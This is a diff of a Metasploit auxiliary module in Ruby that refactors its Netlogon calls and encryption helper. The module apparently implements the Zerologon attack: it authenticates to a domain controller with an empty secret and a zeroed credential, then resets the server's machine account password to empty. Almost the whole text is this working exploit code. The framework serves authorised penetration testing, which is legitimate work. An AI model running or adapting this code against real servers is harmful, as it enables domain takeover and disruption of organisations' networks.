@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(0),
         OptString.new('NBNAME', [ true, 'The server\'s NetBIOS name', '' ]),
-        OptString.new('PASSWORD', [ false, 'The password to restore for the machine account (in hex)' ], conditions: %w{ ACTION == RESTORE }),
+        OptString.new('PASSWORD', [ false, 'The password to restore for the machine account (in hex)' ], conditions: %w[ACTION == RESTORE]),
       ]
     )
   end
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     response = netr_server_password_set2
-    status = response.last(4).unpack1('V')
+    status = response.error_status
     fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0
 
     print_good("Successfully set the machine account (#{datastore['NBNAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)")
@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
 
     response = netr_server_req_challenge(client_challenge: client_challenge)
     session_key = Netlogon.calculate_session_key(EMPTY_SHARED_SECRET, client_challenge, response.server_challenge)
-    ppp = encrypt_netlogon_credential(client_challenge, session_key)
+    ppp = Netlogon.encrypt_credential(session_key, client_challenge)
 
     response = netr_server_authenticate3(client_credential: ppp)
     fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.error_status == 0
@@ -142,12 +142,12 @@ class MetasploitModule < Msf::Auxiliary
     new_password_data = ("\x00" * (512 - password.length)) + password + [password.length].pack('V')
     response = netr_server_password_set2(
       authenticator: Netlogon::NetlogonAuthenticator.new(
-        credential: encrypt_netlogon_credential([ppp.unpack1('Q') + 10].pack('Q'), session_key),
+        credential: Netlogon.encrypt_credential(session_key, [ppp.unpack1('Q') + 10].pack('Q')),
         timestamp: 10
       ),
-      clear_new_password: encrypt_netlogon_credential(new_password_data, session_key)
+      clear_new_password: Netlogon.encrypt_credential(session_key, new_password_data)
     )
-    status = response.last(4).unpack1('V')
+    status = response.error_status
     fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0
 
     print_good("Successfully set machine account (#{datastore['NBNAME']}$) password")
@@ -165,15 +165,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def netr_server_password_set2(authenticator: nil, clear_new_password: "\x00" * 516)
     authenticator ||= Netlogon::NetlogonAuthenticator.new(credential: "\x00" * 8, timestamp: 0)
-    request = NetrServerPasswordSet2Request.new(
-      primary_name: "\\\\#{datastore['NBNAME']}",
-      account_name: "#{datastore['NBNAME']}$",
-      secure_channel_type: :ServerSecureChannel,
-      computer_name: datastore['NBNAME'],
-      authenticator: authenticator,
-      clear_new_password: clear_new_password
-    )
-    dcerpc.call(request.opnum, request.to_binary_s)
+    nrpc_call('NetrServerPasswordSet2',
+              primary_name: "\\\\#{datastore['NBNAME']}",
+              account_name: "#{datastore['NBNAME']}$",
+              secure_channel_type: :ServerSecureChannel,
+              computer_name: datastore['NBNAME'],
+              authenticator: authenticator,
+              clear_new_password: clear_new_password)
   end
 
   def netr_server_req_challenge(client_challenge: "\x00" * 8)
@@ -189,38 +187,9 @@ class MetasploitModule < Msf::Auxiliary
     begin
       raw_response = dcerpc.call(request.opnum, request.to_binary_s)
     rescue Rex::Proto::DCERPC::Exceptions::Fault
-      fail_with(Failure::UnexpectedReply, "The #{name} netlogon RPC request failed")
+      fail_with(Failure::UnexpectedReply, "The #{name} Netlogon RPC request failed")
     end
 
     Netlogon.const_get("#{name}Response").read(raw_response)
-  end
-
-  # [3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)
-  class NetrServerPasswordSet2Request < BinData::Record
-    # quick 'n dirty structure definition for NetrServerPasswordSet2, the primary limitation is what would be a complex,
-    # involved NL_TRUST_PASSWORD implementation to handle each of the 3 variants in which data can be stored
-    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/52d5bd86-5caf-47aa-aae4-cadf7339ec83
-    attr_reader :opnum
-
-    endian :little
-
-    logonsrv_handle :primary_name
-    ndr_string :account_name
-    netlogon_secure_channel_type :secure_channel_type
-    ndr_string :computer_name
-    netlogon_authenticator :authenticator
-    string :clear_new_password, length: 516
-
-    def initialize_instance
-      super
-      @opnum = Netlogon::NETR_SERVER_PASSWORD_SET2
-    end
-  end
-
-  def encrypt_netlogon_credential(input_data, key)
-    cipher = OpenSSL::Cipher.new('AES-128-CFB8').encrypt
-    cipher.iv = "\x00" * 16
-    cipher.key = key
-    cipher.update(input_data) + cipher.final
   end
 end
